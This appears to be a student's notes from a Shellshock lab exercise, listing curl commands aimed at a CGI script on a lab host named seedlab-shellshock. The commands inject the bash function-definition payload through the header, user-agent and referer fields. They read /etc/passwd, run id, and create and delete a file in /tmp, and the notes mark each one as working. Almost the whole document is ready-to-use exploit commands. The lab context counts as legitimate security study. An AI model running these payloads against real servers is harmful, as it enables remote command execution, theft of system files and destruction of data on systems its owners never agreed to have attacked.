Read a file
curl -H
` '() { :;}; echo "Content-Type: text/plain"; echo; /bin/cat /etc/passwd' -v  http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
COMPLETE

Process Info (PUID)
curl -A '() { :;}; echo "Content-Type: text/plain"; echo; /bin/id ' -v  http://www.seedlab-shellshock.com/cgi-bin/vul.cgi

Create a file
curl -e '() { :;}; echo "Content-Type: text/plain"; echo; /bin/touch  /tmp/test.txt' -v  http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
CORRECT
TEST using docksh ### then going in to tmp and running ls

Delete a file
curl -e '() { :;}; echo "Content-Type: text/plain"; echo; /bin/rm /tmp/test.txt' -v  http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
CORRECT

Reading a priveledge file



